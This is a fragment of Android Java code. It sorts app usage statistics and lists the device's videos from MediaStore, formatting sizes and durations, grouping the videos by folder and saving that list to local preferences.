    public static class UsageTimeComparator implements Comparator<UsageStats> {
        @Override
        public final int compare(UsageStats a, UsageStats b) {
            return (int) (b.getTotalTimeInForeground() - a.getTotalTimeInForeground());
        }
    }

    public static class AppNameComparator implements Comparator<UsageStats> {
        private Map<String, String> mAppLabelList;

        AppNameComparator(Map<String, String> appList) {
            mAppLabelList = appList;
        }

        @Override
        public final int compare(UsageStats a, UsageStats b) {
            String alabel = mAppLabelList.get(a.getPackageName());
            String blabel = mAppLabelList.get(b.getPackageName());
            return alabel.compareTo(blabel);
        }
    }

    class getVideos extends AsyncTask<Void, Void, ArrayList<VideoData>> {
        Context context;

        getVideos(Context context) {
            this.context = context;
        }

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            arrayList = new ArrayList<>();

        }

        @Override
        protected ArrayList<VideoData> doInBackground(Void... voids) {

            Uri uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;

            Cursor c = context.getContentResolver().query(uri, null, null, null,
                    MediaStore.Video.VideoColumns.DATE_ADDED + " DESC");


            int vidsCount = 0;

            if (c != null && c.moveToFirst()) {
                vidsCount = c.getCount();
                do {


                    String name = c.getString(c.getColumnIndex(MediaStore.Video.Media.TITLE));
                    String album = c.getString(c.getColumnIndex(MediaStore.Video.Media.ALBUM));
                    String data = c.getString(c.getColumnIndex(MediaStore.Video.Media.DATA));
                    long duration = c.getLong(c.getColumnIndex(MediaStore.Video.Media.DURATION));
                    long size = c.getLong(c.getColumnIndex(MediaStore.Video.Media.SIZE));


                    long fileSizeInKB = size / 1024;


                    VideoData vd = new VideoData(name, album, data, convertDuration(duration), formatFileSize(size));
                    arrayList.add(vd);
                } while (c.moveToNext());
                Log.d("count", vidsCount + "");
                c.close();
            }


            return arrayList;
        }

        public String formatFileSize(long size) {
            String hrSize = null;

            double b = size;
            double k = size / 1024.0;
            double m = ((size / 1024.0) / 1024.0);
            double g = (((size / 1024.0) / 1024.0) / 1024.0);
            double t = ((((size / 1024.0) / 1024.0) / 1024.0) / 1024.0);

            DecimalFormat dec = new DecimalFormat("0.00");

            if (t > 1) {
                hrSize = dec.format(t).concat(" TB");
            } else if (g > 1) {
                hrSize = dec.format(g).concat(" GB");
            } else if (m > 1) {
                hrSize = dec.format(m).concat(" MB");
            } else if (k > 1) {
                hrSize = dec.format(k).concat(" KB");
            } else {
                hrSize = dec.format(b).concat(" Bytes");
            }

            return hrSize;
        }

        public String convertDuration(long duration) {
            String out = null;
            long hours = 0;
            try {
                hours = (duration / 3600000);
            } catch (Exception e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
                return out;
            }
            long remaining_minutes = (duration - (hours * 3600000)) / 60000;
            String minutes = String.valueOf(remaining_minutes);
            if (minutes.equals(0)) {
                minutes = "00";
            }
            long remaining_seconds = (duration - (hours * 3600000) - (remaining_minutes * 60000));
            String seconds = String.valueOf(remaining_seconds);
            if (seconds.length() < 2) {
                seconds = "00";
            } else {
                seconds = seconds.substring(0, 2);
            }

            if (hours > 0) {
                out = hours + ":" + minutes + ":" + seconds;
            } else {
                out = minutes + ":" + seconds;
            }

            return out;

        }

        @Override
        protected void onPostExecute(ArrayList<VideoData> videoDataList) {
            super.onPostExecute(videoDataList);
            if (videoDataList != null) {


                for (i = 0; i < videoDataList.size(); i++) {
                    VideoData videoData = videoDataList.get(i);
                    Log.e(i + "", videoData.getData());

                    int lastInex1 = videoData.getData().lastIndexOf("/");

                    if (lastInex1 != -1) {
                        subString = videoData.getData().substring(0, lastInex1);
                        int lastIndex2 = subString.lastIndexOf("/");
                        folderName = subString.substring(lastIndex2 + 1, lastInex1);
                    }
                    path.add(folderName);


                    for (int i = 0; i < path.size(); i++) {
                        for (j = i + 1; j < path.size(); j++) {
                            if (path.get(i).equals(path.get(j))) {
                                path.remove(j);
                                j--;
                            }
                        }
                    }
                }


                for (int in = 0; in < path.size(); in++) {
                    sbvideos.append(path.get(in) + ",  " +
                            getCountStr(path.get(in)) + "  " +
                            "\n");


                }


                new SavePref(StartCommonFetchingActivity.this).setVideosFolders(sbvideos.toString());


                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {

                        getPicturePaths();

                    }
                }, 1000);


            } else {

            }
        }


    }

}